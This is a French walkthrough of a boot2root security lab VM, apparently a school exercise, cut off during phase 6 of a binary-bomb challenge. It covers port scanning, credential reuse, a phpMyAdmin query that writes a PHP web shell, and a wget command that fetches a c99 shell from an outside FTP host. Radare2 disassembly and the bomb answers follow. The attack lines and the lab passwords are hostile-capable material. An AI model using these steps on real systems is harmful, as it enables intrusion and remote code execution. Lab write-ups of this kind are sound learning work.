On demarre l'exploitation :

// #############################################################################
1) Verification des ports ouverts
// #############################################################################

On utilise nmap qui est un programme pour scanner les ports.
UDP et TCP.
Donc on scanne du port 1-1000 deja.
ont vois quelques port connue :
22 ssh
80 server http
143 imap (webmail)
443 server https
993 imaps (webmail)

// #############################################################################
2) Regarder un peu les site :
// #############################################################################

On vois un index sur le path / en http
On vois un forum sur le path /forum en https
On vois un phpmyadmin sur le path bien connue /phpmyadmin
On vois un webmail sur le path bien connue /webmail

// #############################################################################
3) un peu de stalk sur le forum
// #############################################################################

Apres un peu de stalk on trouve quelques messages sympatique :
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
Monsieur BornToSecHackMe nous offre jentilement sont mot de pass forum :

https://10.11.200.238/forum
login: lmezard
password: !q\]Ej?*5K5cy*AJ

// #############################################################################
4) Le con a laisser le meme password
// #############################################################################

Une fois connecter sur le forum avec lmezard je vais dans profil settings.
Je vois un email :
laurie@borntosec.net

du coup je tente une connection sur le webmail avec cette email est sont mot de passe forum.
Youpi connecter !

https://10.11.200.238/webmail
login: laurie@borntosec.net
password: !q\]Ej?*5K5cy*AJ

// #############################################################################
5) La base de données
// #############################################################################
Une fois connecter sur le webmail deux mails sont presents :
DB Access et Very interesting !!!!
dans BB Access on obtient l'user root mysql est le mot de passe

Use root/Fg-'kKXBj87E:aJ$

// #############################################################################
6) L'exploitation via phpmyadmin
// #############################################################################
Avec les identifiants mysql je peu maintenant me connecter sur phpmyadmin.

SELECT "<?php System($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/get.php"
ensuite pour inserer le shell code :
j'ai installer un shellcode sur un ftp : ftp://185.157.247.103/c99kkkk.php
du coup je fait
https://10.11.200.238/forum/templates_c/get.php?cmd=wget%20ftp://185.157.247.103/c99kkkk.php
ensuite je vais sur https://10.11.200.238/forum/templates_c/c99kkkk.php
voila j'ai mon shell code sur le site.

// #############################################################################
7) Premier mot de passe
// #############################################################################
en me balandant sur /home ont vois un dossier LOOKATME
je vais dedans et je vois un fichier password
cat password

lmezard:G!@M6f4Eatau{sF"

voila le mot de passe de lmezard user.

// #############################################################################
LEXPLOIT COMMENCE
// #############################################################################

// #############################################################################
1) log sur la machine avec lmezard:G!@M6f4Eatau{sF"
// #############################################################################


on est en presence d'un fichier README qui nous dit de completer se challenge pour se loguer en ssh sur laurie
on voit aussi un fichier fun qui semble etre une archive, on ne peut pas l'extraire en place , pas le droit de crer de fichier dans le home de lmezard donc
`tar -xvf fun -C /tmp`
cd /tmp/ft_fun ; ls | wc

751 fichiers .pcap
avec quelques cat on voit qu'ils contiennent les fragments d'un code C
on cherche le main:
grep -A32 "main" *
BJPCP.pcap:int main() {
	BJPCP.pcap-	printf("M");
	BJPCP.pcap-	printf("Y");
	BJPCP.pcap-	printf(" ");
	BJPCP.pcap-	printf("P");
	BJPCP.pcap-	printf("A");
	BJPCP.pcap-	printf("S");
	BJPCP.pcap-	printf("S");
	BJPCP.pcap-	printf("W");
	BJPCP.pcap-	printf("O");
	BJPCP.pcap-	printf("R");
	BJPCP.pcap-	printf("D");
	BJPCP.pcap-	printf(" ");
	BJPCP.pcap-	printf("I");
	BJPCP.pcap-	printf("S");
	BJPCP.pcap-	printf(":");
	BJPCP.pcap-	printf(" ");
	BJPCP.pcap-	printf("%c",getme1());
	BJPCP.pcap-	printf("%c",getme2());
	BJPCP.pcap-	printf("%c",getme3());
	BJPCP.pcap-	printf("%c",getme4());
	BJPCP.pcap-	printf("%c",getme5());
	BJPCP.pcap-	printf("%c",getme6());
	BJPCP.pcap-	printf("%c",getme7());
	BJPCP.pcap-	printf("%c",getme8());
	BJPCP.pcap-	printf("%c",getme9());
	BJPCP.pcap-	printf("%c",getme10());
	BJPCP.pcap-	printf("%c",getme11());
	BJPCP.pcap-	printf("%c",getme12());
	BJPCP.pcap-	printf("\n");
	BJPCP.pcap-	printf("Now SHA-256 it and submit");
	BJPCP.pcap-}

	ne reste plus qu'a trouver ce que nous retourne les fonctions `getme` :
	grep -A1 -E "char getme.*()" *.pcap
	on ne trouve que ce qui ne sont pas couper dans deux fichiers
	qunad on ne voit pas le return on grep le numero de file qui suit le courant, exemple avec getme2():
`grep -A5 "char getme2\(\)" *`
G7Y8I.pcap:char getme2() {
G7Y8I.pcap-
G7Y8I.pcap-//file37
grep -B5 file38$ *                                     no@MacBook-no
ZPY1Q.pcap-	return 'h';
ZPY1Q.pcap-
ZPY1Q.pcap://file38
c'est donc un `h` en deuxieme position

reponse:
Iheartpwnage -sha256-> 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

// #############################################################################
2) ssh laurie@10.11.200.232
// #############################################################################

on est ici en presence d'un fichier README qui nous dit de completer se challenge pour se loguer en ssh sur thor ainsi que des indices pour la resolution
et d'un binaire `bomb`
a l'execution ce binaire nous avertie qu'il y aura 6 etapes ou il nous demandera d'entrer une chaine valide pour passer a la suite. En cas d'erreur 
```BOOM!!!
The bomb has blown up.``` il faut recommencer.

Je scp ce binaire sur mon ordi l'observer avec Radare2 un framework libre dédié à la retro-ingénierie et à l'analyse de fichiers binaires



$> radare2 bomb

## on commence par regarder le main:

[0x080488e0]> pdf @ sym.main
[...]
0x08048a38      6860960408     push str.Welcome_this_is_my_little_bomb______You_have_6_stages_with ; 0x8049660 ; "Welcome this is my little bomb !!!! You have 6 stages with\n" ; size_t nbyte
0x08048a3d      e8cefdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048a42      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:69
0x08048a45      68a0960408     push str.only_one_life_good_luck____Have_a_nice_day ; 0x80496a0 ; "only one life good luck !! Have a nice day!\n" ; int fildes
0x08048a4a      e8c1fdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048a4f      83c420         add esp, 0x20               ; .//bomb.c:72
0x08048a52      e8a5070000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048a57      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:73
0x08048a5a      50             push eax                    ; size_t nbyte
0x08048a5b      e8c0000000     call sym.phase_1
0x08048a60      e8c70a0000     call sym.phase_defused      ; .//bomb.c:74
0x08048a65      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:76
0x08048a68      68e0960408     push str.Phase_1_defused._How_about_the_next_one ; 0x80496e0 ; "Phase 1 defused. How about the next one?\n" ; int fildes
0x08048a6d      e89efdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048a72      83c420         add esp, 0x20               ; .//bomb.c:80
0x08048a75      e882070000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048a7a      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:81
0x08048a7d      50             push eax                    ; size_t nbyte
0x08048a7e      e8c5000000     call sym.phase_2
0x08048a83      e8a40a0000     call sym.phase_defused      ; .//bomb.c:82
0x08048a88      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:83
0x08048a8b      6820970408     push str.That_s_number_2.__Keep_going ; 0x8049720 ; "That's number 2.  Keep going!\n" ; int fildes
0x08048a90      e87bfdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048a95      83c420         add esp, 0x20               ; .//bomb.c:87
0x08048a98      e85f070000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048a9d      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:88
0x08048aa0      50             push eax                    ; size_t nbyte
0x08048aa1      e8f2000000     call sym.phase_3
0x08048aa6      e8810a0000     call sym.phase_defused      ; .//bomb.c:89
0x08048aab      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:90
0x08048aae      683f970408     push str.Halfway_there      ; 0x804973f ; "Halfway there!\n" ; int fildes
0x08048ab3      e858fdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048ab8      83c420         add esp, 0x20               ; .//bomb.c:93
0x08048abb      e83c070000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048ac0      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:94
0x08048ac3      50             push eax                    ; size_t nbyte
0x08048ac4      e817020000     call sym.phase_4
0x08048ac9      e85e0a0000     call sym.phase_defused      ; .//bomb.c:95
0x08048ace      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:96
0x08048ad1      6860970408     push str.So_you_got_that_one.__Try_this_one. ; 0x8049760 ; "So you got that one.  Try this one.\n" ; int fildes
0x08048ad6      e835fdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048adb      83c420         add esp, 0x20               ; .//bomb.c:99
0x08048ade      e819070000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048ae3      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:100
0x08048ae6      50             push eax                    ; size_t nbyte
0x08048ae7      e840020000     call sym.phase_5
0x08048aec      e83b0a0000     call sym.phase_defused      ; .//bomb.c:101
0x08048af1      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:102
0x08048af4      68a0970408     push str.Good_work___On_to_the_next... ; 0x80497a0 ; "Good work!  On to the next...\n" ; int fildes
0x08048af9      e812fdffff     call sym.imp.printf         ; int printf(const char *format)
0x08048afe      83c420         add esp, 0x20               ; .//bomb.c:106
0x08048b01      e8f6060000     call sym.read_line          ; ssize_t read(int fildes, void *buf, size_t nbyte)
0x08048b06      83c4f4         add esp, 0xfffffffffffffff4 ; .//bomb.c:107
0x08048b09      50             push eax
0x08048b0a      e889020000     call sym.phase_6
0x08048b0f      e8180a0000     call sym.phase_defused      ; .//bomb.c:108
[...]

on voit bien les 6 etapes avec un read_line puis un appel a une sous fonction par etape:

#########
#PHASE 1#
#########
[0x080488e0]> pdf @ sym.phase_1
┌ (fcn) sym.phase_1 39
│   sym.phase_1 (int arg_8h);
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048a5b (main)
│           0x08048b20      55             push ebp
│           0x08048b21      89e5           mov ebp, esp
│           0x08048b23      83ec08         sub esp, 8
│           0x08048b26      8b4508         mov eax, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048b29      83c4f8         add esp, 0xfffffffffffffff8
│           0x08048b2c      68c0970408     push str.Public_speaking_is_very_easy. ; 0x80497c0 ; "Public speaking is very easy."
│           0x08048b31      50             push eax
│           0x08048b32      e8f9040000     call sym.strings_not_equal
│           0x08048b37      83c410         add esp, 0x10
│           0x08048b3a      85c0           test eax, eax
│       ┌─< 0x08048b3c      7405           je 0x8048b43
│       │   0x08048b3e      e8b9090000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048b3c (sym.phase_1)
│       └─> 0x08048b43      89ec           mov esp, ebp
│           0x08048b45      5d             pop ebp
└           0x08048b46      c3             ret

ici c'est une simple comparaison de chaine avec `Public speaking is very easy.` c'est donc cette phrase qui nous fera passer a la suite ce qui corespond au hint, un `P` en premiere position

#########
#PHASE 2#
#########
[0x080488e0]> pdf @ sym.phase_2
┌ (fcn) sym.phase_2 79
│   sym.phase_2 (int arg_8h);
│           ; var int local_28h @ ebp-0x28
│           ; var int local_18h @ ebp-0x18
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048a7e (main)
│           0x08048b48      55             push ebp
│           0x08048b49      89e5           mov ebp, esp
│           0x08048b4b      83ec20         sub esp, 0x20
│           0x08048b4e      56             push esi
│           0x08048b4f      53             push ebx
│           0x08048b50      8b5508         mov edx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048b53      83c4f8         add esp, 0xfffffffffffffff8
│           0x08048b56      8d45e8         lea eax, [local_18h]
│           0x08048b59      50             push eax
│           0x08048b5a      52             push edx
│           0x08048b5b      e878040000     call sym.read_six_numbers
│           0x08048b60      83c410         add esp, 0x10
│           0x08048b63      837de801       cmp dword [local_18h], 1    ; eflags ; [0x1:4]=-1
│       ┌─< 0x08048b67      7405           je 0x8048b6e
│       │   0x08048b69      e88e090000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048b67 (sym.phase_2)
│       └─> 0x08048b6e      bb01000000     mov ebx, 1
│           0x08048b73      8d75e8         lea esi, [local_18h]
│              ; JMP XREF from 0x08048b8c (sym.phase_2)
│       ┌─> 0x08048b76      8d4301         lea eax, [ebx + 1]          ; eflags
│       ⁝   0x08048b79      0faf449efc     imul eax, dword [esi + ebx*4 - 4]
│       ⁝   0x08048b7e      39049e         cmp dword [esi + ebx*4], eax ; [0x13:4]=-1 ; 19
│      ┌──< 0x08048b81      7405           je 0x8048b88
│      │⁝   0x08048b83      e874090000     call sym.explode_bomb
│      │:      ; JMP XREF from 0x08048b81 (sym.phase_2)
│      └──> 0x08048b88      43             inc ebx
│       ⁝   0x08048b89      83fb05         cmp ebx, 5                  ; aeim.fd
│       └─< 0x08048b8c      7ee8           jle 0x8048b76
│           0x08048b8e      8d65d8         lea esp, [local_28h]
│           0x08048b91      5b             pop ebx
│           0x08048b92      5e             pop esi
│           0x08048b93      89ec           mov esp, ebp
│           0x08048b95      5d             pop ebp
└           0x08048b96      c3             ret

on voit rapidement qu l'entree est un appel a sym.read_six_numbers qui n'est rien de plus qu'un appel a scanf avec 6 %d et une verification que les 6 parametres sont bien là
apres read_six_numbers  on voit la comparaison ` cmp dword [local_18h], 1` le premier element doit donc etre 1, d'apres le hint on sais aussi que le second element doit etre un `2`
on voit aussi une boucle entre 0x08048b8c 0x8048b76 avec ebx comme iterateur (de 1 a 5) ou il va passer sur les differents elements et verifier que la valeur suivante est egale a la valeur courante multipliée par sa position (de 2 a 6)
 	  	.. 1 
2 x 1 	.. 2
3 x 2 	.. 6
4 x 6   .. 24
5 x 24  .. 120
6 x 120 .. 720

1 2 6 24 120 720

#########
#PHASE 3# ca se complique ...
#########
 (fcn) sym.phase_3 93
│   sym.phase_3 (int arg_8h);
│           ; var int local_18h @ ebp-0x18
│           ; var int local_ch @ ebp-0xc
│           ; var int local_5h @ ebp-0x5
│           ; var int local_4h @ ebp-0x4
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048aa1 (main)
│           0x08048b98      55             push ebp
│           0x08048b99      89e5           mov ebp, esp
│           0x08048b9b      83ec14         sub esp, 0x14
│           0x08048b9e      53             push ebx
│           0x08048b9f      8b5508         mov edx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048ba2      83c4f4         add esp, 0xfffffffffffffff4
│           0x08048ba5      8d45fc         lea eax, [local_4h]
│           0x08048ba8      50             push eax
│           0x08048ba9      8d45fb         lea eax, [local_5h]
│           0x08048bac      50             push eax
│           0x08048bad      8d45f4         lea eax, [local_ch]
│           0x08048bb0      50             push eax
│           0x08048bb1      68de970408     push str.d__c__d            ; 0x80497de ; "%d %c %d"
│           0x08048bb6      52             push edx                    ; ...
│           0x08048bb7      e8a4fcffff     call sym.imp.sscanf         ; int sscanf(const char *s, const char *format,   ...)
│           0x08048bbc      83c420         add esp, 0x20
│           0x08048bbf      83f802         cmp eax, 2                  ; 2
│       ┌─< 0x08048bc2      7f05           jg 0x8048bc9
│       │   0x08048bc4      e833090000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048bc2 (sym.phase_3)
│       └─> 0x08048bc9      837df407       cmp dword [local_ch], 7     ; [0x7:4]=-1 ; 7
│       ┌─< 0x08048bcd      0f87b5000000   ja 0x8048c88
│       │   0x08048bd3      8b45f4         mov eax, dword [local_ch]
│       │   0x08048bd6      ff2485e89704.  jmp dword [eax*4 + 0x80497e8]
        │   0x08048bdd      8d7600         lea esi, [esi]
        │   0x08048be0      b371           mov bl, 0x71                ; 'q' ; 113
        │   0x08048be2      817dfc090300.  cmp dword [ebp - 4], 0x309  ; [0x309:4]=-1 ; 777
       ┌──< 0x08048be9      0f84a0000000   je 0x8048c8f                ; sym.phase_3+0xf7
       ││   0x08048bef      e808090000     call sym.explode_bomb
      ┌───< 0x08048bf4      e996000000     jmp 0x8048c8f               ; sym.phase_3+0xf7
      │││   0x08048bf9      8db426000000.  lea esi, [esi]
      │││   0x08048c00      b362           mov bl, 0x62                ; 'b' ; 98
      │││   0x08048c02      817dfcd60000.  cmp dword [ebp - 4], 0xd6   ; [0xd6:4]=-1 ; 214
     ┌────< 0x08048c09      0f8480000000   je 0x8048c8f                ; sym.phase_3+0xf7
     ││││   0x08048c0f      e8e8080000     call sym.explode_bomb
    ┌─────< 0x08048c14      eb79           jmp 0x8048c8f               ; sym.phase_3+0xf7
    │││││   0x08048c16      b362           mov bl, 0x62                ; 'b' ; 98
    │││││   0x08048c18      817dfcf30200.  cmp dword [ebp - 4], 0x2f3  ; [0x2f3:4]=-1 ; 755
   ┌──────< 0x08048c1f      746e           je 0x8048c8f                ; sym.phase_3+0xf7
   ││││││   0x08048c21      e8d6080000     call sym.explode_bomb
  ┌───────< 0x08048c26      eb67           jmp 0x8048c8f               ; sym.phase_3+0xf7
  │││││││   0x08048c28      b36b           mov bl, 0x6b                ; 'k' ; 107
  │││││││   0x08048c2a      817dfcfb0000.  cmp dword [ebp - 4], 0xfb   ; [0xfb:4]=-1 ; 251
  ────────< 0x08048c31      745c           je 0x8048c8f                ; sym.phase_3+0xf7
  │││││││   0x08048c33      e8c4080000     call sym.explode_bomb
  ────────< 0x08048c38      eb55           jmp 0x8048c8f               ; sym.phase_3+0xf7
  │││││││   0x08048c3a      8db600000000   lea esi, [esi]
  │││││││   0x08048c40      b36f           mov bl, 0x6f                ; 'o' ; 111
  │││││││   0x08048c42      817dfca00000.  cmp dword [ebp - 4], 0xa0   ; [0xa0:4]=-1 ; 160
  ────────< 0x08048c49      7444           je 0x8048c8f                ; sym.phase_3+0xf7
  │││││││   0x08048c4b      e8ac080000     call sym.explode_bomb
  ────────< 0x08048c50      eb3d           jmp 0x8048c8f               ; sym.phase_3+0xf7
  │││││││   0x08048c52      b374           mov bl, 0x74                ; 't' ; 116
  │││││││   0x08048c54      817dfcca0100.  cmp dword [ebp - 4], 0x1ca  ; [0x1ca:4]=-1 ; 458
  ────────< 0x08048c5b      7432           je 0x8048c8f                ; sym.phase_3+0xf7
  │││││││   0x08048c5d      e89a080000     call sym.explode_bomb
  ────────< 0x08048c62      eb2b           jmp 0x8048c8f               ; sym.phase_3+0xf7
  │││││││   0x08048c64      b376           mov bl, 0x76                ; 'v' ; 118
  │││││││   0x08048c66      817dfc0c0300.  cmp dword [ebp - 4], 0x30c  ; [0x30c:4]=-1 ; 780
  ────────< 0x08048c6d      7420           je 0x8048c8f                ; sym.phase_3+0xf7
  │││││││   0x08048c6f      e888080000     call sym.explode_bomb
  ────────< 0x08048c74      eb19           jmp 0x8048c8f               ; sym.phase_3+0xf7
  │││││││   0x08048c76      b362           mov bl, 0x62                ; 'b' ; 98
  │││││││   0x08048c78      817dfc0c0200.  cmp dword [ebp - 4], 0x20c  ; [0x20c:4]=-1 ; 524
  ────────< 0x08048c7f      740e           je 0x8048c8f                ; sym.phase_3+0xf7
  │││││││   0x08048c81      e876080000     call sym.explode_bomb
  ────────< 0x08048c86      eb07           jmp 0x8048c8f               ; sym.phase_3+0xf7
│ │││││││      ; JMP XREF from 0x08048bcd (sym.phase_3)
│ ││││││└─> 0x08048c88      b378           mov bl, 0x78                ; 'x' ; 120
│ ││││││    0x08048c8a      e86d080000     call sym.explode_bomb
│ ││││││       ; XREFS: JMP 0x08048be9  JMP 0x08048bf4  JMP 0x08048c09  JMP 0x08048c14  JMP 0x08048c1f  JMP 0x08048c26  JMP 0x08048c31  JMP 0x08048c38  JMP 0x08048c49
│ ││││││       ; XREFS: JMP 0x08048c50  JMP 0x08048c5b  JMP 0x08048c62  JMP 0x08048c6d  JMP 0x08048c74  JMP 0x08048c7f  JMP 0x08048c86
│ └└└└└└──> 0x08048c8f      3a5dfb         cmp bl, byte [local_5h]
│       ┌─< 0x08048c92      7405           je 0x8048c99
│       │   0x08048c94      e863080000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048c92 (sym.phase_3)
│       └─> 0x08048c99      8b5de8         mov ebx, dword [local_18h]
│           0x08048c9c      89ec           mov esp, ebp
│           0x08048c9e      5d             pop ebp
└           0x08048c9f      c3             ret


cette fois le scanf demmande deux nombres separé par un caractere "%d %c %d" le Hint met en evidence le caractere `b` reste a trouver les nombres, les morceaux de code qui traite du caractere `b` (0x62) sont aux lignes 0x08048c00 ; 0x08048c16 ; 0x08048c76  on va donc chercher a s'y rendre! cette instruction `jmp dword [eax*4 + 0x80497e8]` permet de se deplace en fonction de la valeur rentré en premier parametre dans les trois cas il saute ensuite a la fin de la fonction si une egalité est verifiée entre une valeur en dure (214, 755 et 524) et le dernier parametre qu'on lui envoit, 

mystere les 3 couples fonctionnent `2 b 755 ||  1 b 214 || 7 b 524`


#########
#PHASE 4# ca se complique ... --
#########
[0x080488e0]> pdf @ sym.phase_4
┌ (fcn) sym.phase_4 75
│   sym.phase_4 (int arg_8h);
│           ; var int local_4h @ ebp-0x4
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048ac4 (main)
│           0x08048ce0      55             push ebp
│           0x08048ce1      89e5           mov ebp, esp
│           0x08048ce3      83ec18         sub esp, 0x18
│           0x08048ce6      8b5508         mov edx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048ce9      83c4fc         add esp, 0xfffffffffffffffc
│           0x08048cec      8d45fc         lea eax, [local_4h]
│           0x08048cef      50             push eax
│           0x08048cf0      6808980408     push 0x8049808              ; "%d"
│           0x08048cf5      52             push edx                    ; ...
│           0x08048cf6      e865fbffff     call sym.imp.sscanf         ; int sscanf(const char *s, const char *format,   ...)
│           0x08048cfb      83c410         add esp, 0x10
│           0x08048cfe      83f801         cmp eax, 1                  ; eflags
│       ┌─< 0x08048d01      7506           jne 0x8048d09
│       │   0x08048d03      837dfc00       cmp dword [local_4h], 0
│      ┌──< 0x08048d07      7f05           jg 0x8048d0e
│      │└─> 0x08048d09      e8ee070000     call sym.explode_bomb
│      │       ; JMP XREF from 0x08048d07 (sym.phase_4)
│      └──> 0x08048d0e      83c4f4         add esp, 0xfffffffffffffff4
│           0x08048d11      8b45fc         mov eax, dword [local_4h]
│           0x08048d14      50             push eax
│           0x08048d15      e886ffffff     call sym.func4
│           0x08048d1a      83c410         add esp, 0x10
│           0x08048d1d      83f837         cmp eax, 0x37               ; '7' ; 55
│       ┌─< 0x08048d20      7405           je 0x8048d27
│       │   0x08048d22      e8d5070000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048d20 (sym.phase_4)
│       └─> 0x08048d27      89ec           mov esp, ebp
│           0x08048d29      5d             pop ebp
└           0x08048d2a      c3             ret

ici un seul nombre est attendue par scanf et l'appel a la fonction sym.func4 devra retourner 55 pour valider.
[0x080488e0]> pdf @ sym.func4
┌ (fcn) sym.func4 60
│   sym.func4 (int arg_8h);
│           ; var int local_18h @ ebp-0x18
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048cb7 (sym.func4)
│              ; CALL XREF from 0x08048cc5 (sym.func4)
│              ; CALL XREF from 0x08048d15 (sym.phase_4)
│           0x08048ca0      55             push ebp
│           0x08048ca1      89e5           mov ebp, esp
│           0x08048ca3      83ec10         sub esp, 0x10
│           0x08048ca6      56             push esi
│           0x08048ca7      53             push ebx
│           0x08048ca8      8b5d08         mov ebx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048cab      83fb01         cmp ebx, 1                  ; eflags
│       ┌─< 0x08048cae      7e20           jle 0x8048cd0
│       │   0x08048cb0      83c4f4         add esp, 0xfffffffffffffff4
│       │   0x08048cb3      8d43ff         lea eax, [ebx - 1]
│       │   0x08048cb6      50             push eax
│       │   0x08048cb7      e8e4ffffff     call sym.func4
│       │   0x08048cbc      89c6           mov esi, eax
│       │   0x08048cbe      83c4f4         add esp, 0xfffffffffffffff4
│       │   0x08048cc1      8d43fe         lea eax, [ebx - 2]
│       │   0x08048cc4      50             push eax
│       │   0x08048cc5      e8d6ffffff     call sym.func4
│       │   0x08048cca      01f0           add eax, esi
│      ┌──< 0x08048ccc      eb07           jmp 0x8048cd5
       ││   0x08048cce      89f6           mov esi, esi
│      ││      ; JMP XREF from 0x08048cae (sym.func4)
│      │└─> 0x08048cd0      b801000000     mov eax, 1
│      │       ; JMP XREF from 0x08048ccc (sym.func4)
│      └──> 0x08048cd5      8d65e8         lea esp, [local_18h]
│           0x08048cd8      5b             pop ebx
│           0x08048cd9      5e             pop esi
│           0x08048cda      89ec           mov esp, ebp
│           0x08048cdc      5d             pop ebp
└           0x08048cdd      c3             ret

donc c'est une fonction recursive qui se rapelle avec param - 1 et param -2 , je test l'execution avec gdb et un breakpoint apres l'appel a func4 `break *0x08048d07` avec `p $eax`
je peux voir la valeur retournée par cette fonction, apres quelques tests avec des valeur arbitraire je comprends qu'il s'agit de la suite de fibonacci que calcule cette fonction, et donc pour retourner 55 , il nous faudra `9`

#########
#PHASE 5# ca se complique ... mais on y est presque!
#########
[0x080488e0]> pdf @ sym.phase_5
┌ (fcn) sym.phase_5 105
│   sym.phase_5 (int arg_8h);
│           ; var int local_18h @ ebp-0x18
│           ; var int local_8h @ ebp-0x8
│           ; var int local_2h @ ebp-0x2
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048ae7 (main)
│           0x08048d2c      55             push ebp
│           0x08048d2d      89e5           mov ebp, esp
│           0x08048d2f      83ec10         sub esp, 0x10
│           0x08048d32      56             push esi
│           0x08048d33      53             push ebx
│           0x08048d34      8b5d08         mov ebx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048d37      83c4f4         add esp, 0xfffffffffffffff4
│           0x08048d3a      53             push ebx
│           0x08048d3b      e8d8020000     call sym.string_length
│           0x08048d40      83c410         add esp, 0x10
│           0x08048d43      83f806         cmp eax, 6                  ; 6
│       ┌─< 0x08048d46      7405           je 0x8048d4d
│       │   0x08048d48      e8af070000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048d46 (sym.phase_5)
│       └─> 0x08048d4d      31d2           xor edx, edx
│           0x08048d4f      8d4df8         lea ecx, [local_8h]
│           0x08048d52      be20b20408     mov esi, str.isrveawhobpnutfg ; obj.array.123 ; 0x804b220 ; "isrveawhobpnutfg\xb0\x01"
│              ; JMP XREF from 0x08048d69 (sym.phase_5)
│       ┌─> 0x08048d57      8a041a         mov al, byte [edx + ebx]
│       ⁝   0x08048d5a      240f           and al, 0xf
│       ⁝   0x08048d5c      0fbec0         movsx eax, al
│       ⁝   0x08048d5f      8a0430         mov al, byte [eax + esi]
│       ⁝   0x08048d62      88040a         mov byte [edx + ecx], al
│       ⁝   0x08048d65      42             inc edx
│       ⁝   0x08048d66      83fa05         cmp edx, 5                  ; aeim.fd
│       └─< 0x08048d69      7eec           jle 0x8048d57
│           0x08048d6b      c645fe00       mov byte [local_2h], 0
│           0x08048d6f      83c4f8         add esp, 0xfffffffffffffff8
│           0x08048d72      680b980408     push str.giants             ; 0x804980b ; "giants"
│           0x08048d77      8d45f8         lea eax, [local_8h]
│           0x08048d7a      50             push eax
│           0x08048d7b      e8b0020000     call sym.strings_not_equal
│           0x08048d80      83c410         add esp, 0x10
│           0x08048d83      85c0           test eax, eax
│       ┌─< 0x08048d85      7405           je 0x8048d8c
│       │   0x08048d87      e870070000     call sym.explode_bomb
│       │      ; JMP XREF from 0x08048d85 (sym.phase_5)
│       └─> 0x08048d8c      8d65e8         lea esp, [local_18h]
│           0x08048d8f      5b             pop ebx
│           0x08048d90      5e             pop esi
│           0x08048d91      89ec           mov esp, ebp
│           0x08048d93      5d             pop ebp
└           0x08048d94      c3             ret
ici une chaine est attendue, elle doit mesurer precisement 6 caracteres. on voit qu'une transformation est appliqué a chacun des caracteres avant d'etre comparée a la chaine "giants"
je test avec "qwerty" et un breakpoint apres la transformation break *0x08048d7b je peux ainsi print ma chaine: (gdb) x/s $eax 0xbffff700:	 "shareb" , un autre test avec "qqqqqq" donne "ssssss" donc la position n'influence pas la transformation apres quelques tests je vois que `opekma` done l'attendu "giants" .... ca match avec le hint qui attendais un o en premiere lettre, question suivante!


#########
#PHASE 6# ca se complique++
#########
heu la ca rentre plus dans 27" j'hesite!
[0x080488e0]> pdf @ sym.phase_6
┌ (fcn) sym.phase_6 249
│   sym.phase_6 (int arg_8h);
│           ; var int local_58h @ ebp-0x58
│           ; var int local_3ch @ ebp-0x3c
│           ; var int local_38h @ ebp-0x38
│           ; var int local_34h @ ebp-0x34
│           ; var int local_30h @ ebp-0x30
│           ; var int local_18h @ ebp-0x18
│           ; arg int arg_8h @ ebp+0x8
│              ; CALL XREF from 0x08048b0a (main)
│           0x08048d98      55             push ebp
│           0x08048d99      89e5           mov ebp, esp
│           0x08048d9b      83ec4c         sub esp, 0x4c               ; 'L'
│           0x08048d9e      57             push edi
│           0x08048d9f      56             push esi
│           0x08048da0      53             push ebx
│           0x08048da1      8b5508         mov edx, dword [arg_8h]     ; [0x8:4]=-1 ; 8
│           0x08048da4      c745cc6cb204.  mov dword [local_34h], obj.node1 ; 0x804b26c
│           0x08048dab      83c4f8         add esp, 0xfffffffffffffff8
│           0x08048dae      8d45e8         lea eax, [local_18h]
│           0x08048db1      50             push eax
│           0x08048db2      52             push edx
